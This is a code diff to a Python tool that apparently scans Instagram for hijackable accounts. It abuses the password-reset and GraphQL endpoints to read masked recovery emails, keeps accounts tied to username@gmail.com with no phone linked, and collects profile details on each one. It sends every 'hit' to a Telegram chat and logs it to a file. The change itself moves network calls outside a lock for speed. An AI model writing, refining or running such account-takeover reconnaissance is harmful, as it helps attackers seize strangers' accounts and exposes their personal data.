@@ -950,79 +950,82 @@ def _m1_masked_matches_username(username, masked):
 
 def _m1_save_hit(username, user, token, chat_id):
     global _m1_hits, _m1_total, _m1_found_emails
-    with _m1_hit_lock:
-        user_id    = user.get('pk', 'Unknown')
-        followers  = user.get('follower_count', 0)
-        following  = user.get('following_count', 0)
-        bio        = user.get('biography', 'None') or 'None'
-        year_label = str(gdate(user_id))
-        reset_text = _m1_rest_v1(username)
 
-        # Helper: returns True if value is a real masked email (not a failure)
-        def _is_real_masked(v):
-            return bool(v and v not in ('-', '') and not v.startswith('Fail:') and '@' in v)
+    # ── All network calls run OUTSIDE the lock so threads don't queue up ──────
+    def _is_real_masked(v):
+        return bool(v and v not in ('-', '') and not v.startswith('Fail:') and '@' in v)
 
-        # PRIMARY CHECK: search username on Instagram's reset endpoint.
-        # If it gives back a real masked email, it must match username@gmail.com.
-        # That masked email is also what we display in the Reset field of the hit.
-        if _is_real_masked(reset_text):
-            if not _m1_masked_matches_username(username, reset_text):
-                return
+    user_id    = user.get('pk', 'Unknown')
+    followers  = user.get('follower_count', 0)
+    following  = user.get('following_count', 0)
+    bio        = user.get('biography', 'None') or 'None'
+    year_label = str(gdate(user_id))
 
-        about      = _m1_get_about_account(user_id, username)
-        join_date  = about.get("join_date") or year_label
-        _yr = re.search(r'\b(20\d{2})\b', join_date)
-        if _yr:
-            year_label = _yr.group(1)
-        country_nm = about.get("country") or "-"
-        country_fl = _m1_get_country_flag(country_nm)
-        country    = f"{country_nm} {country_fl}".strip() if country_fl else country_nm
-        former_raw = about.get("former_usernames", [])
-        former     = ", ".join(former_raw) if former_raw else "-"
-        masked, has_phone = _m1_get_masked(username)
-
-        # Skip accounts with a phone number linked — not our target
-        if has_phone:
+    # PRIMARY CHECK: Instagram password-reset endpoint gives the masked email.
+    # If it returns a real masked email that doesn't match → not our target.
+    reset_text = _m1_rest_v1(username)
+    if _is_real_masked(reset_text):
+        if not _m1_masked_matches_username(username, reset_text):
             return
 
-        # SECONDARY CHECK: GraphQL masked email.
-        # If present it must match; silent (None) means unknown — not wrong.
-        if masked:
-            if not _m1_masked_matches_username(username, masked):
-                return
+    about      = _m1_get_about_account(user_id, username)
+    join_date  = about.get("join_date") or year_label
+    _yr = re.search(r'\b(20\d{2})\b', join_date)
+    if _yr:
+        year_label = _yr.group(1)
+    country_nm = about.get("country") or "-"
+    country_fl = _m1_get_country_flag(country_nm)
+    country    = f"{country_nm} {country_fl}".strip() if country_fl else country_nm
+    former_raw = about.get("former_usernames", [])
+    former     = ", ".join(former_raw) if former_raw else "-"
+    masked, has_phone = _m1_get_masked(username)
 
-        # Both checks above only reject on a CONFIRMED mismatch.
-        # If both endpoints returned nothing (rate-limited / down) we still
-        # save — silence is ambiguous, not proof the email is wrong.
+    # Skip accounts with a phone number linked — not our target
+    if has_phone:
+        return
+
+    # SECONDARY CHECK: GraphQL masked email must match if present.
+    if masked:
+        if not _m1_masked_matches_username(username, masked):
+            return
+
+    # Best masked email for the Reset field (reset endpoint > GraphQL > plain)
+    email_str  = f"{username}@gmail.com"
+    if not _is_real_masked(reset_text):
+        reset_text = masked if masked else email_str
+
+    output = format_hit(
+        hit_num    = 0,          # placeholder; replaced inside the lock below
+        username   = username,
+        email      = email_str,
+        followers  = followers,
+        following  = following,
+        bio        = bio,
+        year_label = year_label,
+        reset_text = reset_text,
+        join_date  = join_date,
+        country    = country,
+        masked     = masked,
+        former     = former,
+    )
+
+    # ── Lock only for counter update + hit number assignment ─────────────────
+    with _m1_hit_lock:
         _m1_hits  += 1
         _m1_total += 1
-        email_str = f"{username}@gmail.com"
-        # Show the real masked value from Instagram as reset_text so it matches
-        # what Instagram displays. Fall back to email_str only when unavailable.
-        if not _is_real_masked(reset_text):
-            reset_text = masked if masked else email_str
-        output = format_hit(
-            hit_num    = _m1_hits,
-            username   = username,
-            email      = email_str,
-            followers  = followers,
-            following  = following,
-            bio        = bio,
-            year_label = year_label,
-            reset_text = reset_text,
-            join_date  = join_date,
-            country    = country,
-            masked     = masked,
-            former     = former,
-        )
-        with _m1_found_lock:
-            if email_str not in _m1_found_emails:
-                _m1_found_emails.append(email_str)
-        _send_telegram(token, chat_id, output)
-        _save_hit_to_file(output)
-        with _web_lock:
-            _web_state['hits']  = _m1_hits
-            _web_state['total'] = _m1_total
+        hit_num    = _m1_hits
+
+    # Patch the placeholder hit number into the already-built output string
+    output = output.replace("HIT #0", f"HIT #{hit_num}", 1)
+
+    with _m1_found_lock:
+        if email_str not in _m1_found_emails:
+            _m1_found_emails.append(email_str)
+    _send_telegram(token, chat_id, output)
+    _save_hit_to_file(output)
+    with _web_lock:
+        _web_state['hits']  = _m1_hits
+        _web_state['total'] = _m1_total
 
 def _m1_cgmail(email, token, chat_id, user, loc_session):
     global _m1_bad_email, _m1_taken
@@ -1610,35 +1613,15 @@ def _m2_save_hit(username, user_data, token, chat_id):
             return
         email = f"{username}@gmail.com"
 
-        # Helper: real masked email or not
-        def _is_real_masked(v):
-            return bool(v and v not in ('-', '') and not v.startswith('Fail:') and '@' in v)
-
-        # PRIMARY CHECK: search username on Instagram's reset endpoint.
-        # If it gives back a real masked email, it must match username@gmail.com.
-        # That masked email is also what we display in the Masked field of the hit.
-        reset_text = _m1_rest_v1(username)
-        if _is_real_masked(reset_text):
-            if not _m1_masked_matches_username(username, reset_text):
-                return   # masked email from reset page does not match → skip
-
-        # SECONDARY CHECK: GraphQL masked email (by username)
+        # CHECK: GraphQL masked email — if present it must match username@gmail.com.
+        # _m2_lookup already confirmed the email is linked to an IG account via
+        # bloks search, so silence here is fine; only reject on a clear mismatch.
         gmail_masked = _m2_get_masked(username)
         if gmail_masked:
             if not _m1_masked_matches_username(username, gmail_masked):
                 return   # masked email from GraphQL does not match → skip
 
-        # Both checks above only reject on a CONFIRMED mismatch.
-        # Silence (None / '-') from either endpoint is ambiguous — not proof the
-        # email is wrong — so we allow the hit through.
-
-        # Build the best reset display value we have
-        if _is_real_masked(reset_text):
-            display_reset = reset_text
-        elif gmail_masked:
-            display_reset = gmail_masked
-        else:
-            display_reset = email
+        display_reset = gmail_masked if gmail_masked else email
 
         with _m2_hit_lock:
             _m2_hits  += 1
